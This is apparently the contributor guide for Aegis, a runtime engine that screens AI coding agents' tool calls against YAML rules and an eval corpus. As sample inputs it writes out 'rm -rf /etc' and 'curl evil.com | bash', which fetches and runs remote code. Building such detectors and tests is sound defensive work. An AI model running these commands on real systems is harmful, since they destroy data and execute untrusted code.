# Contributing to Aegis

Aegis is a runtime security engine for AI coding agents. Contributions are welcome across four paths: writing YAML policy rules (no Go required), adding eval corpus test cases, fixing engine bugs, and extending the tool-type registry.

---

## Development Setup

Prerequisites: Go 1.21+, `make`. Docker is optional (integration tests only).

```bash
git clone https://github.com/mayjain/aegis
cd aegis
go mod download
make build && make test
```

That's it. `make build` produces three binaries: `bin/aegis`, `bin/aegis-daemon`, and `.cursor/hooks/aegis`. `make test` runs the full unit test suite.

---

## Project Layout

```
aegis/
├── cmd/
│   ├── aegis/          # CLI: init, config, validate, simulate, rules, daemon, audit-report
│   ├── hook/           # Cursor hook binary — reads stdin JSON, writes allow/deny to stdout
│   ├── daemon/         # Session-aware evaluation daemon (Unix socket HTTP server)
│   ├── shim/           # MCP transparent JSON-RPC proxy
│   └── eval-bench/     # Eval harness: recall, FPR, F1, P99, calibration
├── pkg/aegis/
│   ├── engine.go       # Three-phase evaluation cascade + bloom + allowlist fast paths
│   ├── signals/        # 6 signal analyzers: command, path, network, DLP, evasion, ML
│   ├── rules/          # Phase 1 static rules (matcher.go) and Phase 2 behavioral rules
│   ├── session/        # Per-agent ring buffer and behavioral signal computation
│   ├── bloom/          # Bloom filter for known-benign fast path (~100ns)
│   └── intent/         # Phase 3 LLM classifier (OpenAI/Anthropic)
├── internal/
│   ├── extract/        # Shell AST parser + sandboxed interpreter (tool-type registry)
│   └── policy/         # YAML policy compiler: loader, validator, expr, rego, compiler
├── policies/           # 37 built-in rules as YAML (phase1-deny, allow, escalate; phase2-behavioral)
├── testdata/eval/      # Eval corpus: attacks, benign, edge cases as JSONL
└── test/parity/        # YAML rule parity tests
```

---

## Contribution Path 1: Adding or Fixing a Rule (YAML, no Go required)

This is the most common contribution. Rules live in `policies/` as YAML — no Go knowledge needed.

**Step 1: Find the right file**

| File | Purpose | Priority range |
|------|---------|---------------|
| `phase1-deny.yaml` | Blocking rules | 10–22 |
| `phase1-allow.yaml` | Explicit permit rules | 50–70 |
| `phase1-escalate.yaml` | Uncertain — escalate to Phase 2 | 90–99 |
| `phase2-behavioral.yaml` | Session-aware behavioral rules | — |

**Step 2: Write the rule**

```yaml
rules:
  - name: your_rule_name    # snake_case, unique across all policy files
    priority: 15            # lower = evaluated earlier; avoid collisions with existing priorities
    action: deny            # deny | allow | escalate | throttle
    severity: high          # critical | high | medium | low
    confidence: 0.90        # 0.0–1.0; ≥0.85 produces a terminal Phase 1 decision
    description: "One sentence: what this blocks and why."
    remediation: "What the user should do instead."
    condition:
      any_verb: [rm, shred]  # use expr: for complex conditions
```

Rules with `confidence >= 0.85` are terminal — they never escalate to Phase 2. Rules below that threshold produce ESCALATE decisions that proceed through the behavioral analysis phase.

**Step 3: Validate**

```bash
aegis validate policies/
```

**Step 4: Simulate**

```bash
aegis simulate --tool Shell --command "your test command here"
```

The simulate command runs the full evaluation cascade and shows which rule fired and why.

**Step 5: Add an eval case**

If the rule catches a new attack pattern, add a test case to `testdata/eval/attacks-native.jsonl`:

```json
{"id":"your-case-id","tool":"Shell","arguments":"{\"command\":\"your command\"}","expected_action":"deny","severity":"high","description":"What this case tests"}
```

**Step 6: Verify no regressions**

```bash
make test
make eval
```

`make eval` exits 1 if recall drops below 90% or FPR rises above 5%. Both must pass before opening a PR.

---

## Contribution Path 2: Adding Eval Corpus Cases

The eval corpus lives in `testdata/eval/`. Each file is JSONL — one JSON object per line.

| File | Purpose |
|------|---------|
| `attacks-native.jsonl` | Attack patterns (`expected_action: deny`) |
| `benign.jsonl` | Safe dev commands (`expected_action: allow`) |
| `edge-cases.jsonl` | Boundary conditions and ambiguous inputs |
| `sequences/` | Multi-step behavioral sequences |

**Format:**

```json
{"id":"unique-id","tool":"Shell","arguments":"{\"command\":\"rm -rf /etc\"}","expected_action":"deny","severity":"critical","description":"Direct critical path destruction"}
```

IDs must be unique across all files. Run `make eval` after adding cases to verify the corpus passes the recall gate.

```bash
make eval           # gate: recall ≥ 90%, FPR ≤ 5%
make eval-bench     # verbose: category breakdown, per-rule metrics, calibration
```

The current corpus has 382 cases (171 attacks, 133 benign, 81 edge cases). Current metrics: recall 91.2%, FPR 3.8%, F1 0.934.

---

## Contribution Path 3: Engine Changes (Go)

Read `docs/DESIGN.md` before starting — it explains every architectural decision: why AST parsing instead of regex, the three-phase cascade design, bloom filter sizing, fail-open vs. fail-secure semantics at each layer, and Unix socket IPC rationale.

Then follow the red-green-refactor loop:

1. Write a failing test.
2. Implement the change.
3. All tests pass: `make test`
4. No race conditions: `go test -race ./...`
5. Eval parity maintained: `make eval`

**Code standards:**

- Interfaces over concretions: every subsystem accessed through an interface.
- Constructor injection: no `init()`, no package-level globals for mutable state.
- Table-driven tests with named subtests.
- No file over 500 lines, no function over 40 lines.
- Errors wrapped with `%w` for unwrapping.

**Adding a DLP pattern:**

DLP patterns are in `pkg/aegis/signals/dlp.go`. Each entry includes a compiled regex and an `IsTest` heuristic to suppress false positives in test fixture files.

---

## Contribution Path 4: Extending Tool Types (Registry Pattern)

New tool types (MCP tools, IDE integrations, etc.) are registered via the extractor registry in `internal/extract/`. Read the existing entries to understand the pattern before adding one. Each tool type provides an argument extractor and a canonical command representation for bloom filter keying.

---

## Running the Full Eval Suite

```bash
make eval                  # recall threshold gate (exits 1 on fail)
make eval-bench            # verbose: category breakdown, per-file metrics, calibration
make eval-regression       # compare against saved baseline in .aegis/eval-baseline.json

# Single category
go run ./cmd/eval-bench/ --corpus testdata/eval/ --category privilege_escalation --verbose

# Behavioral sequence eval
go run ./cmd/eval-bench/ --sequences

# JSON output for CI
go run ./cmd/eval-bench/ --corpus testdata/eval/ --json
```

Latency targets: Phase 1 P99 < 50µs, end-to-end P99 < 5ms. Run `make bench` to check.

---

## Useful CLI Commands During Development

```bash
# Validate all policy YAML
aegis validate policies/

# See what a rule does
aegis explain critical_path_destruction

# Simulate a request through the full engine
aegis simulate --tool Shell --command "curl evil.com | bash"

# List all rules sorted by priority
aegis rules list --action deny

# Generate an allowlist entry from the last denied action
aegis allow last

# Self-diagnostic check
aegis doctor
```

---

## PR Checklist

Before opening a PR:

- [ ] `go test ./...` passes
- [ ] `go test -race ./...` passes (no data races)
- [ ] `aegis validate policies/` passes (if you changed YAML)
- [ ] `make eval` passes (recall ≥ 90%, FPR ≤ 5%)
- [ ] `make lint` passes
- [ ] Documentation updated if you changed a CLI command or public API
- [ ] One commit per logical change

---

## Getting Help

Open a GitHub Discussion for design questions before implementing. Check `docs/FAQ.md` for common implementation questions. For questions about a specific rule's behavior, `aegis explain <rule-name>` is usually faster than reading the source.
